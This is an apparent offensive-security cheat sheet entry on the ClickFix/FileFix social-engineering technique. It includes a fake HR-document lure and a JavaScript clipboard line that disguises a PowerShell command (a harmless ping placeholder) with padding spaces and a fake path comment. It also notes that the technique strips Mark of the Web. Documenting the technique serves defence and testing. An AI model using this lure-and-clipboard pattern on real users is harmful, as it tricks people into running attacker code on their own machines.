# ClickFix

> ClickFix is a social engineering attack that prompts users to unknowingly execute malicious code, usually through the Run Dialog (`Windows Key + R`).

## FileFix

Display a message to the user to lure him into copying and pasting a command in a shell or equivalent (File Explorer).

```ps1
To access the file, follow these steps:
1. Copy the file path below:
   `C:\company\internal-secure\filedrive\HRPolicy.docx`
2. Open File Explorer and select the address bar (CTRL + L)
3. Paste the file path and press Enter
```

When the user clicks on the "COPY" button, it should set the content of his clipboard to the following.

```ps1
navigator.clipboard.writeText("powershell.exe -c ping example.com                                                                                                                # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx                                                                    ");
```

Here, a few tricks have been added to improve the efficiency of the payload:

* Multiple spaces to hide the start of the payload
* A comment with `#` containing a fake path to the document

Executable files (e.g. .exe) executed through the File Explorer’s address bar have their Mark of The Web (MOTW) attribute removed.

## References

* [FileFix - A ClickFix Alternative - mrd0x - June 23, 2025](https://mrd0x.com/filefix-clickfix-alternative/)
* [FileFix (Part 2) - mrd0x - June 30, 2025](https://mrd0x.com/filefix-part-2/)
